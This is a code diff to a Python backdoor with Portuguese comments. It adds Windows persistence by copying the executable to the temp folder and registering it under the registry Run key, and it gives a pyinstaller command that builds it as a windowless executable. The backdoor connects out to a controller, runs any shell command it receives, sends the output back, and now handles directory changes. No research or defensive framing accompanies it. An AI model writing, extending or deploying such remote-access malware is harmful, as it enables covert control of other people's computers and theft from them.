@@ -13,6 +13,20 @@ import socket
 import os
 import time
 import subprocess
+import tempfile
+
+nome_arquivo='backdoor.exe'
+TEMPDIR = tempfile.gettempdir() #
+
+# pyinstaller -F --clean -w backdoor.py -i icone.png
+
+def persistencia():
+    if(not os.getcwd() == TEMPDIR):
+        subprocess.Popen('copy ' + nome_arquivo + ' ' + TEMPDIR, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
+        FNULL = open(os.devnull,'w')
+        subprocess.Popen("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ /v backdoor /d " + TEMPDIR + "\\" + nome_arquivo, stdout=FNULL, sderr=FNULL)
+
+
 
 def conecta(IP, PORT):
     try:
@@ -31,9 +45,16 @@ def executa(socket):
                 return
             else:
                 try:
-                    comando = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
-                    retorno = comando.stdout.read() + comando.stderr.read()
-                    socket.send(retorno)
+                    dados = dados.split(' ')
+                    if(dados[0]=='cd'):
+                        dados.remove('cd')
+                        dados = ' '.join(dados)
+                        os.chdir(dados)
+                        print(os.listdir(os.getcwd()))
+                    else:
+                        comando = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
+                        retorno = comando.stdout.read() + comando.stderr.read()
+                        socket.send(retorno)
                 except:
                     return
         except: # algum erro ocorreu, recomeça
@@ -47,7 +68,8 @@ def main():
         if(conexao):
             executa(conexao)
         else:
-            time.sleep(10)
+            time.sleep(5)
 
 if __name__=='__main__':
+    persistencia()
     main()
